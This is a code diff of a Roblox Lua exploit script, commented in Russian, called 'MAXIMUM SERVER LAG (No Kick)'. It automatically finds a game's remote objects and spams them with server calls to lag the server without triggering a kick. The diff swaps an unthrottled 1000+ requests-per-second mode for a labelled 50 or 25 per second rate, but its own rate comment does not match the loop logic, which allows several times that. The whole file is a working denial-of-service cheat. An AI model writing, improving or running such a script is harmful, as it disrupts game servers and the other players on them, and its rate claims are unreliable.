@@ -1,4 +1,4 @@
--- MAXIMUM SERVER LAG (No Kick)
+-- MAXIMUM SERVER LAG (No Kick) - 50 REQS/SEC
 local player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -93,7 +93,7 @@ lagTitle.Parent = lagSection
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, -10, 0, 60)
 statusLabel.Position = UDim2.new(0, 10, 0, 30)
-statusLabel.Text = "Status: DISABLED\nRequests: 0\nMode: Safe"
+statusLabel.Text = "Status: DISABLED\nRequests: 0\nMode: 50/sec"
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 statusLabel.BackgroundTransparency = 1
 statusLabel.TextSize = 12
@@ -127,16 +127,16 @@ local function createActionButton(xPosition, text, color)
 end
 
 local toggleBtn = createActionButton(0, "MAX LAG ON", Color3.fromRGB(200, 60, 60))
-local modeBtn = createActionButton(0.52, "SAFE MODE", Color3.fromRGB(80, 120, 200))
+local modeBtn = createActionButton(0.52, "50/SEC MODE", Color3.fromRGB(80, 120, 200))
 
 -- Функции для кнопок
 local function setupButtonHover(button)
     local originalColor = button.BackgroundColor3
     button.MouseEnter:Connect(function()
-        tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor * 1.2}):Play()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor * 1.2}):Play()
     end)
     button.MouseLeave:Connect(function()
-        tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
     end)
 end
 
@@ -145,7 +145,7 @@ setupButtonHover(toggleBtn)
 setupButtonHover(modeBtn)
 
 local scriptRunning = true
-local safeMode = true
+local requestsPerSecond = 50 -- Ограничение до 50 запросов в секунду
 
 local function closeGUI()
     scriptRunning = false
@@ -207,13 +207,16 @@ local function findRemoteObjects()
     print("📡 Auto-found " .. #foundRemotes .. " remote objects")
 end
 
--- МАКСИМАЛЬНЫЕ ЛАГИ БЕЗ КИКОВ
-local function sendMaximumRequests()
+-- МАКСИМАЛЬНЫЕ ЛАГИ БЕЗ КИКОВ (50 запросов/сек)
+local function sendLimitedRequests()
     if not LagEnabled or #foundRemotes == 0 then return end
     
-    -- Используем все найденные Remote объекты
+    local requestsThisCycle = 0
+    local maxRequestsPerCycle = math.min(requestsPerSecond, 50) -- Максимум 50
+    
+    -- Используем все найденные Remote объекты, но ограничиваем количество
     for i, remote in pairs(foundRemotes) do
-        if not LagEnabled then break end
+        if not LagEnabled or requestsThisCycle >= maxRequestsPerCycle then break end
         
         pcall(function()
             if remote:IsA("RemoteEvent") then
@@ -230,58 +233,36 @@ local function sendMaximumRequests()
                 local data = safeData[math.random(1, #safeData)]
                 remote:FireServer(data)
                 requestCount = requestCount + 1
+                requestsThisCycle = requestsThisCycle + 1
                 
             elseif remote:IsA("RemoteFunction") then
                 remote:InvokeServer("request_" .. math.random(1, 100), math.random(1, 100))
                 requestCount = requestCount + 1
+                requestsThisCycle = requestsThisCycle + 1
             end
         end)
         
-        -- Без задержки для максимальной скорости
-        if safeMode then
-            wait(0.001) -- Минимальная задержка в безопасном режиме
-        end
-        -- В небезопасном режиме - без задержки вообще
-    end
-end
-
--- ДОПОЛНИТЕЛЬНЫЙ ИНТЕНСИВНЫЙ СПАМ
-local function intensiveSpam()
-    if not LagEnabled or #foundRemotes == 0 then return end
-    
-    for i = 1, 10 do
-        if not LagEnabled then break end
-        
-        local remote = foundRemotes[math.random(1, #foundRemotes)]
-        pcall(function()
-            if remote:IsA("RemoteEvent") then
-                for j = 1, 5 do
-                    remote:FireServer("fast_spam_" .. j, math.random())
-                    requestCount = requestCount + 1
-                end
-            end
-        end)
-        
-        if safeMode then
-            wait(0.0001)
+        -- Задержка для ограничения скорости
+        if requestsThisCycle % 10 == 0 then -- Каждые 10 запросов небольшая пауза
+            wait(0.01)
         end
     end
 end
 
--- Переключение режима безопасности
+-- Переключение режима скорости
 modeBtn.MouseButton1Click:Connect(function()
-    safeMode = not safeMode
-    
-    if safeMode then
-        modeBtn.Text = "SAFE MODE"
-        modeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
-        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: Safe", LagEnabled and "ENABLED" or "DISABLED", requestCount)
-        print("🛡️ Safe mode enabled")
+    if requestsPerSecond == 50 then
+        requestsPerSecond = 25 -- Медленный режим
+        modeBtn.Text = "25/SEC MODE"
+        modeBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
+        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: 25/sec", LagEnabled and "ENABLED" or "DISABLED", requestCount)
+        print("🐢 Slow mode enabled - 25 requests/sec")
     else
-        modeBtn.Text = "MAX MODE"
-        modeBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 60)
-        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: MAXIMUM", LagEnabled and "ENABLED" or "DISABLED", requestCount)
-        print("💥 MAXIMUM mode enabled - extreme lag!")
+        requestsPerSecond = 50 -- Нормальный режим
+        modeBtn.Text = "50/SEC MODE"
+        modeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
+        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: 50/sec", LagEnabled and "ENABLED" or "DISABLED", requestCount)
+        print("⚡ Normal mode enabled - 50 requests/sec")
     end
 end)
 
@@ -290,13 +271,13 @@ toggleBtn.MouseButton1Click:Connect(function()
     LagEnabled = not LagEnabled
     
     if LagEnabled then
-        statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+        statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %d/sec", requestCount, requestsPerSecond)
         statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
         toggleBtn.Text = "MAX LAG OFF"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
-        print("🚀 MAXIMUM LAG ACTIVATED! Using " .. #foundRemotes .. " remotes")
+        print("🚀 MAXIMUM LAG ACTIVATED! Using " .. #foundRemotes .. " remotes at " .. requestsPerSecond .. "/sec")
     else
-        statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+        statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %d/sec", requestCount, requestsPerSecond)
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         toggleBtn.Text = "MAX LAG ON"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
@@ -312,12 +293,12 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         LagEnabled = not LagEnabled
         
         if LagEnabled then
-            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %d/sec", requestCount, requestsPerSecond)
             statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
             toggleBtn.Text = "MAX LAG OFF"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
         else
-            statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+            statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %d/sec", requestCount, requestsPerSecond)
             statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
             toggleBtn.Text = "MAX LAG ON"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
@@ -329,15 +310,11 @@ end)
 spawn(function()
     while scriptRunning do
         if LagEnabled then
-            sendMaximumRequests()
-            intensiveSpam()
-            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+            sendLimitedRequests()
+            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %d/sec", requestCount, requestsPerSecond)
             
-            if safeMode then
-                wait(0.01) -- 100 запросов в секунду в безопасном режиме
-            else
-                wait(0.001) -- 1000+ запросов в секунду в максимальном режиме
-            end
+            -- Фиксированная задержка для точного контроля скорости
+            wait(0.1) -- 10 циклов в секунду = ~50 запросов/сек
         else
             wait(0.5)
         end
@@ -361,5 +338,5 @@ end)
 print("💥💥💥 MAXIMUM SERVER LAG LOADED!")
 print("📡 Auto-found " .. #foundRemotes .. " remote objects")
 print("🎮 Click MAX LAG ON or press L to start")
-print("🛡️ Safe mode: Less lag but no kicks")
-print("💥 Max mode: Extreme lag (use carefully)")
+print("⚡ Normal mode: 50 requests/sec (safe)")
+print("🐢 Slow mode: 25 requests/sec (very safe)")
